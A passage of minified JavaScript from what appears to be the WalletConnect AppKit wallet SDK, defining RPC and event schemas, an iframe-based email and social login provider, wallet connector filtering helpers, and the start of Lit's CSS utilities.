AccountType:U.optional(U.string())}),Uz=U.object({uri:U.string()}),$z=U.object({isConnected:U.boolean()}),Lz=U.object({chainId:U.string().or(U.number())}),Fz=U.object({chainId:U.string().or(U.number())}),jz=U.object({newEmail:U.string().email()}),qz=U.object({smartAccountEnabledNetworks:U.array(U.number())});U.object({address:U.string(),isDeployed:U.boolean()});const zz=U.object({version:U.string().optional()}),Hz=U.object({type:U.string(),address:U.string()}),Wz=U.any(),Gz=U.object({method:U.literal("eth_accounts")}),Vz=U.object({method:U.literal("eth_blockNumber")}),Kz=U.object({method:U.literal("eth_call"),params:U.array(U.any())}),Qz=U.object({method:U.literal("eth_chainId")}),Yz=U.object({method:U.literal("eth_estimateGas"),params:U.array(U.any())}),Jz=U.object({method:U.literal("eth_feeHistory"),params:U.array(U.any())}),Zz=U.object({method:U.literal("eth_gasPrice")}),Xz=U.object({method:U.literal("eth_getAccount"),params:U.array(U.any())}),eH=U.object({method:U.literal("eth_getBalance"),params:U.array(U.any())}),tH=U.object({method:U.literal("eth_getBlockByHash"),params:U.array(U.any())}),rH=U.object({method:U.literal("eth_getBlockByNumber"),params:U.array(U.any())}),nH=U.object({method:U.literal("eth_getBlockReceipts"),params:U.array(U.any())}),iH=U.object({method:U.literal("eth_getBlockTransactionCountByHash"),params:U.array(U.any())}),sH=U.object({method:U.literal("eth_getBlockTransactionCountByNumber"),params:U.array(U.any())}),oH=U.object({method:U.literal("eth_getCode"),params:U.array(U.any())}),aH=U.object({method:U.literal("eth_getFilterChanges"),params:U.array(U.any())}),cH=U.object({method:U.literal("eth_getFilterLogs"),params:U.array(U.any())}),uH=U.object({method:U.literal("eth_getLogs"),params:U.array(U.any())}),lH=U.object({method:U.literal("eth_getProof"),params:U.array(U.any())}),hH=U.object({method:U.literal("eth_getStorageAt"),params:U.array(U.any())}),dH=U.object({method:U.literal("eth_getTransactionByBlockHashAndIndex"),params:U.array(U.any())}),fH=U.object({method:U.literal("eth_getTransactionByBlockNumberAndIndex"),params:U.array(U.any())}),pH=U.object({method:U.literal("eth_getTransactionByHash"),params:U.array(U.any())}),gH=U.object({method:U.literal("eth_getTransactionCount"),params:U.array(U.any())}),mH=U.object({method:U.literal("eth_getTransactionReceipt"),params:U.array(U.any())}),yH=U.object({method:U.literal("eth_getUncleCountByBlockHash"),params:U.array(U.any())}),wH=U.object({method:U.literal("eth_getUncleCountByBlockNumber"),params:U.array(U.any())}),bH=U.object({method:U.literal("eth_maxPriorityFeePerGas")}),vH=U.object({method:U.literal("eth_newBlockFilter")}),EH=U.object({method:U.literal("eth_newFilter"),params:U.array(U.any())}),AH=U.object({method:U.literal("eth_newPendingTransactionFilter")}),_H=U.object({method:U.literal("eth_sendRawTransaction"),params:U.array(U.any())}),CH=U.object({method:U.literal("eth_syncing"),params:U.array(U.any())}),IH=U.object({method:U.literal("eth_uninstallFilter"),params:U.array(U.any())}),qE=U.object({method:U.literal("personal_sign"),params:U.array(U.any())}),xH=U.object({method:U.literal("eth_signTypedData_v4"),params:U.array(U.any())}),SH=U.object({method:U.literal("eth_sendTransaction"),params:U.array(U.any())}),NH=U.object({method:U.literal("solana_signMessage"),params:U.object({message:U.string(),pubkey:U.string()})}),TH=U.object({method:U.literal("solana_signTransaction"),params:U.object({transaction:U.string()})}),PH=U.object({method:U.literal("solana_signAllTransactions"),params:U.object({transactions:U.array(U.string())})}),RH=U.object({method:U.literal("solana_signAndSendTransaction"),params:U.object({transaction:U.string(),options:U.object({skipPreflight:U.boolean().optional(),preflightCommitment:U.enum(["processed","confirmed","finalized","recent","single","singleGossip","root","max"]).optional(),maxRetries:U.number().optional(),minContextSlot:U.number().optional()}).optional()})}),OH=U.object({method:U.literal("wallet_sendCalls"),params:U.array(U.object({chainId:U.string().or(U.number()).optional(),from:U.string().optional(),version:U.string().optional(),capabilities:U.any().optional(),calls:U.array(U.object({to:U.string().startsWith("0x"),data:U.string().startsWith("0x").optional(),value:U.string().optional()}))}))}),kH=U.object({method:U.literal("wallet_getCallsStatus"),params:U.array(U.string())}),DH=U.object({method:U.literal("wallet_getCapabilities")}),MH=U.object({method:U.literal("wallet_grantPermissions"),params:U.array(U.any())}),BH=U.object({method:U.literal("wallet_revokePermissions"),params:U.any()}),UH=U.object({method:U.literal("wallet_getAssets"),params:U.any()}),zE=U.object({token:U.string()}),de=U.object({id:U.string().optional()}),fu={appEvent:de.extend({type:he("APP_SWITCH_NETWORK"),payload:bz}).or(de.extend({type:he("APP_CONNECT_EMAIL"),payload:vz})).or(de.extend({type:he("APP_CONNECT_DEVICE")})).or(de.extend({type:he("APP_CONNECT_OTP"),payload:Ez})).or(de.extend({type:he("APP_CONNECT_SOCIAL"),payload:Az})).or(de.extend({type:he("APP_GET_FARCASTER_URI")})).or(de.extend({type:he("APP_CONNECT_FARCASTER")})).or(de.extend({type:he("APP_GET_USER"),payload:U.optional(_z)})).or(de.extend({type:he("APP_GET_SOCIAL_REDIRECT_URI"),payload:Cz})).or(de.extend({type:he("APP_SIGN_OUT")})).or(de.extend({type:he("APP_IS_CONNECTED"),payload:U.optional(zE)})).or(de.extend({type:he("APP_GET_CHAIN_ID")})).or(de.extend({type:he("APP_GET_SMART_ACCOUNT_ENABLED_NETWORKS")})).or(de.extend({type:he("APP_INIT_SMART_ACCOUNT")})).or(de.extend({type:he("APP_SET_PREFERRED_ACCOUNT"),payload:Pz})).or(de.extend({type:he("APP_RPC_REQUEST"),payload:qE.or(UH).or(Gz).or(Vz).or(Kz).or(Qz).or(Yz).or(Jz).or(Zz).or(Xz).or(eH).or(tH).or(rH).or(nH).or(iH).or(sH).or(oH).or(aH).or(cH).or(uH).or(lH).or(hH).or(dH).or(fH).or(pH).or(gH).or(mH).or(yH).or(wH).or(bH).or(vH).or(EH).or(AH).or(_H).or(CH).or(IH).or(qE).or(xH).or(SH).or(NH).or(TH).or(PH).or(RH).or(kH).or(OH).or(DH).or(MH).or(BH)})).or(de.extend({type:he("APP_UPDATE_EMAIL"),payload:Iz})).or(de.extend({type:he("APP_UPDATE_EMAIL_PRIMARY_OTP"),payload:xz})).or(de.extend({type:he("APP_UPDATE_EMAIL_SECONDARY_OTP"),payload:Sz})).or(de.extend({type:he("APP_SYNC_THEME"),payload:Nz})).or(de.extend({type:he("APP_SYNC_DAPP_DATA"),payload:Tz})).or(de.extend({type:he("APP_RELOAD")})),frameEvent:de.extend({type:he("FRAME_SWITCH_NETWORK_ERROR"),payload:Zt}).or(de.extend({type:he("FRAME_SWITCH_NETWORK_SUCCESS"),payload:Fz})).or(de.extend({type:he("FRAME_CONNECT_EMAIL_SUCCESS"),payload:Rz})).or(de.extend({type:he("FRAME_CONNECT_EMAIL_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_GET_FARCASTER_URI_SUCCESS"),payload:Oz})).or(de.extend({type:he("FRAME_GET_FARCASTER_URI_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_CONNECT_FARCASTER_SUCCESS"),payload:kz})).or(de.extend({type:he("FRAME_CONNECT_FARCASTER_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_CONNECT_OTP_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_CONNECT_OTP_SUCCESS")})).or(de.extend({type:he("FRAME_CONNECT_DEVICE_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_CONNECT_DEVICE_SUCCESS")})).or(de.extend({type:he("FRAME_CONNECT_SOCIAL_SUCCESS"),payload:Dz})).or(de.extend({type:he("FRAME_CONNECT_SOCIAL_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_GET_USER_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_GET_USER_SUCCESS"),payload:Bz})).or(de.extend({type:he("FRAME_GET_SOCIAL_REDIRECT_URI_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_GET_SOCIAL_REDIRECT_URI_SUCCESS"),payload:Uz})).or(de.extend({type:he("FRAME_SIGN_OUT_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_SIGN_OUT_SUCCESS")})).or(de.extend({type:he("FRAME_IS_CONNECTED_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_IS_CONNECTED_SUCCESS"),payload:$z})).or(de.extend({type:he("FRAME_GET_CHAIN_ID_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_GET_CHAIN_ID_SUCCESS"),payload:Lz})).or(de.extend({type:he("FRAME_RPC_REQUEST_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_RPC_REQUEST_SUCCESS"),payload:Wz})).or(de.extend({type:he("FRAME_SESSION_UPDATE"),payload:zE})).or(de.extend({type:he("FRAME_UPDATE_EMAIL_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_UPDATE_EMAIL_SUCCESS"),payload:Mz})).or(de.extend({type:he("FRAME_UPDATE_EMAIL_PRIMARY_OTP_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_UPDATE_EMAIL_PRIMARY_OTP_SUCCESS")})).or(de.extend({type:he("FRAME_UPDATE_EMAIL_SECONDARY_OTP_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_UPDATE_EMAIL_SECONDARY_OTP_SUCCESS"),payload:jz})).or(de.extend({type:he("FRAME_SYNC_THEME_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_SYNC_THEME_SUCCESS")})).or(de.extend({type:he("FRAME_SYNC_DAPP_DATA_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_SYNC_DAPP_DATA_SUCCESS")})).or(de.extend({type:he("FRAME_GET_SMART_ACCOUNT_ENABLED_NETWORKS_SUCCESS"),payload:qz})).or(de.extend({type:he("FRAME_GET_SMART_ACCOUNT_ENABLED_NETWORKS_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_INIT_SMART_ACCOUNT_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_SET_PREFERRED_ACCOUNT_SUCCESS"),payload:Hz})).or(de.extend({type:he("FRAME_SET_PREFERRED_ACCOUNT_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_READY"),payload:zz})).or(de.extend({type:he("FRAME_RELOAD_ERROR"),payload:Zt})).or(de.extend({type:he("FRAME_RELOAD_SUCCESS")}))};function Og(t,e={}){var r;return typeof(e==null?void 0:e.type)=="string"&&((r=e==null?void 0:e.type)==null?void 0:r.includes(t))}class $H{constructor({projectId:e,isAppClient:r=!1,chainId:n="eip155:1",enableLogger:i=!0}){if(this.iframe=null,this.rpcUrl=Z.BLOCKCHAIN_API_RPC_URL,this.initFrame=()=>{const s=document.getElementById("w3m-iframe");this.iframe&&!s&&document.body.appendChild(this.iframe)},this.events={registerFrameEventHandler:(s,o,a)=>{function c({data:u}){if(!Og(me.FRAME_EVENT_KEY,u))return;const l=fu.frameEvent.parse(u);l.id===s&&(o(l),window.removeEventListener("message",c))}Nn.isClient&&(window.addEventListener("message",c),a.addEventListener("abort",()=>{window.removeEventListener("message",c)}))},onFrameEvent:s=>{Nn.isClient&&window.addEventListener("message",({data:o})=>{if(!Og(me.FRAME_EVENT_KEY,o))return;const a=fu.frameEvent.parse(o);s(a)})},onAppEvent:s=>{Nn.isClient&&window.addEventListener("message",({data:o})=>{if(!Og(me.APP_EVENT_KEY,o))return;const a=fu.appEvent.parse(o);s(a)})},postAppEvent:s=>{var o;if(Nn.isClient){if(!((o=this.iframe)!=null&&o.contentWindow))throw new Error("W3mFrame: iframe is not set");fu.appEvent.parse(s),this.iframe.contentWindow.postMessage(s,"*")}},postFrameEvent:s=>{if(Nn.isClient){if(!parent)throw new Error("W3mFrame: parent is not set");fu.frameEvent.parse(s),parent.postMessage(s,"*")}}},this.projectId=e,this.frameLoadPromise=new Promise((s,o)=>{this.frameLoadPromiseResolver={resolve:s,reject:o}}),r&&(this.frameLoadPromise=new Promise((s,o)=>{this.frameLoadPromiseResolver={resolve:s,reject:o}}),Nn.isClient)){const s=document.createElement("iframe");s.id="w3m-iframe",s.src=`${MF}?projectId=${e}&chainId=${n}&version=${UF}&enableLogger=${i}`,s.name="w3m-secure-iframe",s.style.position="fixed",s.style.zIndex="999999",s.style.display="none",s.style.animationDelay="0s, 50ms",s.style.borderBottomLeftRadius="clamp(0px, var(--wui-border-radius-l), 44px)",s.style.borderBottomRightRadius="clamp(0px, var(--wui-border-radius-l), 44px)",this.iframe=s,this.iframe.onerror=()=>{var o;(o=this.frameLoadPromiseResolver)==null||o.reject("Unable to load email login dependency")},this.events.onFrameEvent(o=>{var a;o.type==="@w3m-frame/READY"&&((a=this.frameLoadPromiseResolver)==null||a.resolve(void 0))})}}get networks(){const e=["eip155:1","eip155:5","eip155:11155111","eip155:10","eip155:420","eip155:42161","eip155:421613","eip155:137","eip155:80001","eip155:42220","eip155:1313161554","eip155:1313161555","eip155:56","eip155:97","eip155:43114","eip155:43113","eip155:324","eip155:280","eip155:100","eip155:8453","eip155:84531","eip155:84532","eip155:7777777","eip155:999","solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp","solana:4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z","solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1"].map(r=>({[r]:{rpcUrl:`${this.rpcUrl}/v1/?chainId=${r}&projectId=${this.projectId}`,chainId:r}}));return Object.assign({},...e)}}class LH{constructor(e){var s;const r=Dc({level:BF}),{logger:n,chunkLoggerController:i}=G0({opts:r});this.logger=Gr(n,this.constructor.name),this.chunkLoggerController=i,typeof window<"u"&&((s=this.chunkLoggerController)!=null&&s.downloadLogsBlobInBrowser)&&(window.downloadAppKitLogsBlob||(window.downloadAppKitLogsBlob={}),window.downloadAppKitLogsBlob.sdk=()=>{var o;(o=this.chunkLoggerController)!=null&&o.downloadLogsBlobInBrowser&&this.chunkLoggerController.downloadLogsBlobInBrowser({projectId:e})})}}class FH{constructor({projectId:e,chainId:r,enableLogger:n=!0,onTimeout:i}){this.openRpcRequests=[],n&&(this.w3mLogger=new LH(e)),this.w3mFrame=new $H({projectId:e,isAppClient:!0,chainId:r,enableLogger:n}),this.onTimeout=i,this.getLoginEmailUsed()&&this.w3mFrame.initFrame(),this.initPromise=new Promise(s=>{this.w3mFrame.events.onFrameEvent(async o=>{o.type===me.FRAME_READY&&(this.initPromise=void 0,await new Promise(a=>{setTimeout(a,500)}),s())})})}async init(){this.w3mFrame.initFrame(),this.initPromise&&await this.initPromise}getLoginEmailUsed(){return!!Pr.get(me.EMAIL_LOGIN_USED_KEY)}getEmail(){return Pr.get(me.EMAIL)}getUsername(){return Pr.get(me.SOCIAL_USERNAME)}async reload(){var e;try{this.w3mFrame.initFrame(),await this.appEvent({type:me.APP_RELOAD})}catch(r){throw(e=this.w3mLogger)==null||e.logger.error({error:r},"Error reloading iframe"),r}}async connectEmail(e){var r;try{Nn.checkIfAllowedToTriggerEmail(),this.w3mFrame.initFrame();const n=await this.appEvent({type:me.APP_CONNECT_EMAIL,payload:e});return this.setNewLastEmailLoginTime(),n}catch(n){throw(r=this.w3mLogger)==null||r.logger.error({error:n},"Error connecting email"),n}}async connectDevice(){var e;try{return this.appEvent({type:me.APP_CONNECT_DEVICE})}catch(r){throw(e=this.w3mLogger)==null||e.logger.error({error:r},"Error connecting device"),r}}async connectOtp(e){var r;try{return this.appEvent({type:me.APP_CONNECT_OTP,payload:e})}catch(n){throw(r=this.w3mLogger)==null||r.logger.error({error:n},"Error connecting otp"),n}}async isConnected(){var e;try{if(!this.getLoginEmailUsed())return{isConnected:!1};const r=await this.appEvent({type:me.APP_IS_CONNECTED});return r!=null&&r.isConnected||this.deleteAuthLoginCache(),r}catch(r){throw this.deleteAuthLoginCache(),(e=this.w3mLogger)==null||e.logger.error({error:r},"Error checking connection"),r}}async getChainId(){var e;try{const r=await this.appEvent({type:me.APP_GET_CHAIN_ID});return this.setLastUsedChainId(r.chainId),r}catch(r){throw(e=this.w3mLogger)==null||e.logger.error({error:r},"Error getting chain id"),r}}async getSocialRedirectUri(e){var r;try{return this.w3mFrame.initFrame(),this.appEvent({type:me.APP_GET_SOCIAL_REDIRECT_URI,payload:e})}catch(n){throw(r=this.w3mLogger)==null||r.logger.error({error:n},"Error getting social redirect uri"),n}}async updateEmail(e){var r;try{const n=await this.appEvent({type:me.APP_UPDATE_EMAIL,payload:e});return this.setNewLastEmailLoginTime(),n}catch(n){throw(r=this.w3mLogger)==null||r.logger.error({error:n},"Error updating email"),n}}async updateEmailPrimaryOtp(e){var r;try{return this.appEvent({type:me.APP_UPDATE_EMAIL_PRIMARY_OTP,payload:e})}catch(n){throw(r=this.w3mLogger)==null||r.logger.error({error:n},"Error updating email primary otp"),n}}async updateEmailSecondaryOtp(e){var r;try{const n=await this.appEvent({type:me.APP_UPDATE_EMAIL_SECONDARY_OTP,payload:e});return this.setLoginSuccess(n.newEmail),n}catch(n){throw(r=this.w3mLogger)==null||r.logger.error({error:n},"Error updating email secondary otp"),n}}async syncTheme(e){var r;try{return this.appEvent({type:me.APP_SYNC_THEME,payload:e})}catch(n){throw(r=this.w3mLogger)==null||r.logger.error({error:n},"Error syncing theme"),n}}async syncDappData(e){var r;try{return this.appEvent({type:me.APP_SYNC_DAPP_DATA,payload:e})}catch(n){throw(r=this.w3mLogger)==null||r.logger.error({error:n},"Error syncing dapp data"),n}}async getSmartAccountEnabledNetworks(){var e;try{const r=await this.appEvent({type:me.APP_GET_SMART_ACCOUNT_ENABLED_NETWORKS});return this.persistSmartAccountEnabledNetworks(r.smartAccountEnabledNetworks),r}catch(r){throw this.persistSmartAccountEnabledNetworks([]),(e=this.w3mLogger)==null||e.logger.error({error:r},"Error getting smart account enabled networks"),r}}async setPreferredAccount(e){var r;try{return this.appEvent({type:me.APP_SET_PREFERRED_ACCOUNT,payload:{type:e}})}catch(n){throw(r=this.w3mLogger)==null||r.logger.error({error:n},"Error setting preferred account"),n}}async connect(e){var r;try{const n=(e==null?void 0:e.chainId)||this.getLastUsedChainId()||1,i=await this.getUser({chainId:n,preferredAccountType:e==null?void 0:e.preferredAccountType});return this.setLoginSuccess(i.email),this.setLastUsedChainId(i.chainId),this.user=i,i}catch(n){throw(r=this.w3mLogger)==null||r.logger.error({error:n},"Error connecting"),n}}async getUser(e){var r;try{const n=(e==null?void 0:e.chainId)||this.getLastUsedChainId()||1,i=await this.appEvent({type:me.APP_GET_USER,payload:{...e,chainId:n}});return this.user=i,i}catch(n){throw(r=this.w3mLogger)==null||r.logger.error({error:n},"Error connecting"),n}}async connectSocial(e){var r;try{this.w3mFrame.initFrame();const n=await this.appEvent({type:me.APP_CONNECT_SOCIAL,payload:{uri:e}});return n.userName&&this.setSocialLoginSuccess(n.userName),n}catch(n){throw(r=this.w3mLogger)==null||r.logger.error({error:n},"Error connecting social"),n}}async getFarcasterUri(){var e;try{return this.w3mFrame.initFrame(),await this.appEvent({type:me.APP_GET_FARCASTER_URI})}catch(r){throw(e=this.w3mLogger)==null||e.logger.error({error:r},"Error getting farcaster uri"),r}}async connectFarcaster(){var e;try{const r=await this.appEvent({type:me.APP_CONNECT_FARCASTER});return r.userName&&this.setSocialLoginSuccess(r.userName),r}catch(r){throw(e=this.w3mLogger)==null||e.logger.error({error:r},"Error connecting farcaster"),r}}async switchNetwork(e){var r;try{const n=await this.appEvent({type:me.APP_SWITCH_NETWORK,payload:{chainId:e}});return this.setLastUsedChainId(n.chainId),n}catch(n){throw(r=this.w3mLogger)==null||r.logger.error({error:n},"Error switching network"),n}}async disconnect(){var e;try{const r=await this.appEvent({type:me.APP_SIGN_OUT});return this.deleteAuthLoginCache(),r}catch(r){throw(e=this.w3mLogger)==null||e.logger.error({error:r},"Error disconnecting"),r}}async request(e){var r,n,i,s;try{if(cr.GET_CHAIN_ID===e.method)return this.getLastUsedChainId();(r=this.rpcRequestHandler)==null||r.call(this,e);const o=await this.appEvent({type:me.APP_RPC_REQUEST,payload:e});return(n=this.rpcSuccessHandler)==null||n.call(this,o,e),o}catch(o){throw(i=this.rpcErrorHandler)==null||i.call(this,o,e),(s=this.w3mLogger)==null||s.logger.error({error:o},"Error requesting"),o}}onRpcRequest(e){this.rpcRequestHandler=e}onRpcSuccess(e){this.rpcSuccessHandler=e}onRpcError(e){this.rpcErrorHandler=e}onIsConnected(e){this.w3mFrame.events.onFrameEvent(r=>{r.type===me.FRAME_IS_CONNECTED_SUCCESS&&r.payload.isConnected&&e()})}onNotConnected(e){this.w3mFrame.events.onFrameEvent(r=>{r.type===me.FRAME_IS_CONNECTED_ERROR&&e(),r.type===me.FRAME_IS_CONNECTED_SUCCESS&&!r.payload.isConnected&&e()})}onConnect(e){this.w3mFrame.events.onFrameEvent(r=>{r.type===me.FRAME_GET_USER_SUCCESS&&e(r.payload)})}onSocialConnected(e){this.w3mFrame.events.onFrameEvent(r=>{r.type===me.FRAME_CONNECT_SOCIAL_SUCCESS&&e(r.payload)})}async getCapabilities(){try{return await this.request({method:"wallet_getCapabilities"})||{}}catch{return{}}}onSetPreferredAccount(e){this.w3mFrame.events.onFrameEvent(r=>{r.type===me.FRAME_SET_PREFERRED_ACCOUNT_SUCCESS?e(r.payload):r.type===me.FRAME_SET_PREFERRED_ACCOUNT_ERROR&&e({type:cr.ACCOUNT_TYPES.EOA})})}onGetSmartAccountEnabledNetworks(e){this.w3mFrame.events.onFrameEvent(r=>{r.type===me.FRAME_GET_SMART_ACCOUNT_ENABLED_NETWORKS_SUCCESS?e(r.payload.smartAccountEnabledNetworks):r.type===me.FRAME_GET_SMART_ACCOUNT_ENABLED_NETWORKS_ERROR&&e([])})}getAvailableChainIds(){return Object.keys(this.w3mFrame.networks)}rejectRpcRequests(){var e;try{this.openRpcRequests.forEach(({abortController:r,method:n})=>{cr.SAFE_RPC_METHODS.includes(n)||r.abort()}),this.openRpcRequests=[]}catch(r){(e=this.w3mLogger)==null||e.logger.error({error:r},"Error aborting RPC request")}}async appEvent(e){await this.w3mFrame.frameLoadPromise;let r;function n(a){return a.replace("@w3m-app/","")}const i=new AbortController,s=n(e.type);return[me.APP_CONNECT_EMAIL,me.APP_CONNECT_DEVICE,me.APP_CONNECT_OTP,me.APP_CONNECT_SOCIAL,me.APP_GET_SOCIAL_REDIRECT_URI].map(n).includes(s)&&(r=setTimeout(()=>{var a;(a=this.onTimeout)==null||a.call(this),i.abort()},3e4)),new Promise((a,c)=>{var h,d,g;const u=Math.random().toString(36).substring(7);if((g=(h=this.w3mLogger)==null?void 0:(d=h.logger).info)==null||g.call(d,{event:e,id:u},"Sending app event"),this.w3mFrame.events.postAppEvent({...e,id:u}),s==="RPC_REQUEST"){const y=e;this.openRpcRequests=[...this.openRpcRequests,{...y.payload,abortController:i}]}i.signal.addEventListener("abort",()=>{s==="RPC_REQUEST"?c(new Error("Request was aborted")):s!=="GET_FARCASTER_URI"&&c(new Error("Something went wrong"))});function l(y,m){var b,A,_;y.id===u&&((A=m==null?void 0:(b=m.logger).info)==null||A.call(b,{framEvent:y,id:u},"Received frame response"),y.type===`@w3m-frame/${s}_SUCCESS`?(r&&clearTimeout(r),"payload"in y&&a(y.payload),a(void 0)):y.type===`@w3m-frame/${s}_ERROR`&&(r&&clearTimeout(r),"payload"in y&&c(new Error(((_=y.payload)==null?void 0:_.message)||"An error occurred")),c(new Error("An error occurred"))))}this.w3mFrame.events.registerFrameEventHandler(u,y=>l(y,this.w3mLogger),i.signal)})}setNewLastEmailLoginTime(){Pr.set(me.LAST_EMAIL_LOGIN_TIME,Date.now().toString())}setSocialLoginSuccess(e){Pr.set(me.SOCIAL_USERNAME,e)}setLoginSuccess(e){e&&Pr.set(me.EMAIL,e),Pr.set(me.EMAIL_LOGIN_USED_KEY,"true"),Pr.delete(me.LAST_EMAIL_LOGIN_TIME)}deleteAuthLoginCache(){Pr.delete(me.EMAIL_LOGIN_USED_KEY),Pr.delete(me.EMAIL),Pr.delete(me.LAST_USED_CHAIN_KEY),Pr.delete(me.SOCIAL_USERNAME)}setLastUsedChainId(e){e&&Pr.set(me.LAST_USED_CHAIN_KEY,String(e))}getLastUsedChainId(){const e=Pr.get(me.LAST_USED_CHAIN_KEY)??void 0,r=Number(e);return isNaN(r)?e:r}persistSmartAccountEnabledNetworks(e){Pr.set(me.SMART_ACCOUNT_ENABLED_NETWORKS,e.join(","))}}class Qo{constructor(){}static getInstance({projectId:e,chainId:r,enableLogger:n,onTimeout:i}){return Qo.instance||(Qo.instance=new FH({projectId:e,chainId:r,enableLogger:n,onTimeout:i})),Qo.instance}}var HE={};const jH={ACCOUNT_TABS:[{label:"Tokens"},{label:"NFTs"},{label:"Activity"}],SECURE_SITE_ORIGIN:(typeof process<"u"&&typeof HE<"u"?HE.NEXT_PUBLIC_SECURE_SITE_ORIGIN:void 0)||"https://secure.walletconnect.org",VIEW_DIRECTION:{Next:"next",Prev:"prev"},DEFAULT_CONNECT_METHOD_ORDER:["email","social","wallet"],ANIMATION_DURATIONS:{HeaderText:120,ModalHeight:150,ViewTransition:150}},x0={filterOutDuplicatesByRDNS(t){const e=te.state.enableEIP6963?Oe.state.connectors:[],r=le.getRecentWallets(),n=e.map(a=>{var c;return(c=a.info)==null?void 0:c.rdns}).filter(Boolean),i=r.map(a=>a.rdns).filter(Boolean),s=n.concat(i);if(s.includes("io.metamask.mobile")&&Ie.isMobile()){const a=s.indexOf("io.metamask.mobile");s[a]="io.metamask"}return t.filter(a=>!s.includes(String(a==null?void 0:a.rdns)))},filterOutDuplicatesByIds(t){const e=Oe.state.connectors.filter(a=>a.type==="ANNOUNCED"||a.type==="INJECTED"),r=le.getRecentWallets(),n=e.map(a=>a.explorerId),i=r.map(a=>a.id),s=n.concat(i);return t.filter(a=>!s.includes(a==null?void 0:a.id))},filterOutDuplicateWallets(t){const e=this.filterOutDuplicatesByRDNS(t);return this.filterOutDuplicatesByIds(e)},markWalletsAsInstalled(t){const{connectors:e}=Oe.state,r=e.filter(s=>s.type==="ANNOUNCED").reduce((s,o)=>{var a;return(a=o.info)!=null&&a.rdns&&(s[o.info.rdns]=!0),s},{});return t.map(s=>({...s,installed:!!s.rdns&&!!r[s.rdns??""]})).sort((s,o)=>Number(o.installed)-Number(s.installed))},getConnectOrderMethod(t,e){var c;const r=(t==null?void 0:t.connectMethodsOrder)||((c=te.state.features)==null?void 0:c.connectMethodsOrder),n=e||Oe.state.connectors;if(r)return r;const{injected:i,announced:s}=dd.getConnectorsByType(n,xe.state.recommended,xe.state.featured),o=i.filter(dd.showConnector),a=s.filter(dd.showConnector);return o.length||a.length?["wallet","email","social"]:jH.DEFAULT_CONNECT_METHOD_ORDER},isExcluded(t){const e=!!t.rdns&&xe.state.excludedWallets.some(n=>n.rdns===t.rdns),r=!!t.name&&xe.state.excludedWallets.some(n=>Vf.isLowerCaseMatch(n.name,t.name));return e||r}},dd={getConnectorsByType(t,e,r){const{customWallets:n}=te.state,i=le.getRecentWallets(),s=x0.filterOutDuplicateWallets(e),o=x0.filterOutDuplicateWallets(r),a=t.filter(h=>h.type==="MULTI_CHAIN"),c=t.filter(h=>h.type==="ANNOUNCED"),u=t.filter(h=>h.type==="INJECTED"),l=t.filter(h=>h.type==="EXTERNAL");return{custom:n,recent:i,external:l,multiChain:a,announced:c,injected:u,recommended:s,featured:o}},showConnector(t){var i;const e=(i=t.info)==null?void 0:i.rdns,r=!!e&&xe.state.excludedWallets.some(s=>!!s.rdns&&s.rdns===e),n=!!t.name&&xe.state.excludedWallets.some(s=>Vf.isLowerCaseMatch(s.name,t.name));return!(t.type==="INJECTED"&&(!Ie.isMobile()&&t.name==="Browser Wallet"||!e&&!At.checkInstalled()||r||n)||(t.type==="ANNOUNCED"||t.type==="EXTERNAL")&&(r||n))},getIsConnectedWithWC(){return Array.from(q.state.chains.values()).some(r=>Oe.getConnectorId(r.namespace)===Z.CONNECTOR_ID.WALLET_CONNECT)},getConnectorTypeOrder({recommended:t,featured:e,custom:r,recent:n,announced:i,injected:s,multiChain:o,external:a,overriddenConnectors:c=(u=>(u=te.state.features)==null?void 0:u.connectorTypeOrder)()??[]}){const l=dd.getIsConnectedWithWC(),g=[{type:"walletConnect",isEnabled:te.state.enableWalletConnect&&!l},{type:"recent",isEnabled:n.length>0},{type:"injected",isEnabled:[...s,...i,...o].length>0},{type:"featured",isEnabled:e.length>0},{type:"custom",isEnabled:r&&r.length>0},{type:"external",isEnabled:a.length>0},{type:"recommended",isEnabled:t.length>0}].filter(A=>A.isEnabled),y=new Set(g.map(A=>A.type)),m=c.filter(A=>y.has(A)).map(A=>({type:A,isEnabled:!0})),b=g.filter(({type:A})=>!m.some(({type:T})=>T===A));return Array.from(new Set([...m,...b].map(({type:A})=>A)))}};/**
 * @license
 * Copyright 2019 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const fd=globalThis,$y=fd.ShadowRoot&&(fd.ShadyCSS===void 0||fd.ShadyCSS.nativeShadow)&&"adoptedStyleSheets"in Document.prototype&&"replace"in CSSStyleSheet.prototype,Ly=Symbol(),WE=new WeakMap;let k2=class{constructor(e,r,n){if(this._$cssResult$=!0,n!==Ly)throw Error("CSSResult is not constructable. Use `unsafeCSS` or `css` instead.");this.cssText=e,this.t=r}get styleSheet(){let e=this.o;const r=this.t;if($y&&e===void 0){const n=r!==void 0&&r.length===1;n&&(e=WE.get(r)),e===void 0&&((this.o=e=new CSSStyleSheet).replaceSync(this.cssText),n&&WE.set(r,e))}return e}toString(){return this.cssText}};const Fn=t=>new k2(typeof t=="string"?t:t+"",void 0,Ly),ac=(t,...e)=>{const r=t.length===1?t[0]:e.reduce((n,i,s)=>n+(o=>{if(o._$cssResult$===!0)return o.cssText;if(typeof o=="number")return o;throw Error("Value passed to 'css' function must be a 'css' function result: "+o+". Use 'unsafeCSS' to pass non-literal values, but take care to ensure page security.")})(i)+t[s+1],t[0]);return new 